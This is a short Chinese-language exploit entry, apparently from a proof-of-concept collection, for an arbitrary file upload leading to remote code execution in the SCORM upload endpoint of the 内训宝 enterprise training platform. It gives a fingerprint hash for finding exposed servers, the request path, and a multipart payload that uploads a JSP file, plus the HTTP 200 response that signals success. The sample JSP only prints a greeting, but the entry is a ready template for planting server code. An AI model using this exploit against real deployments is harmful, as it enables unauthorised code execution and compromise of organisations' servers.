# 内训宝企业培训平台scorm任意文件上传导致RCE漏洞

内训宝企业培训平台scorm ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="-790843908"`
- **请求**：`POST /upload/scorm HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="fileupload"; filename="hello.jsp"
Content-Type: application/octet-stream
<% out.println("Hello, World!"); %>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```
- **响应特征**：200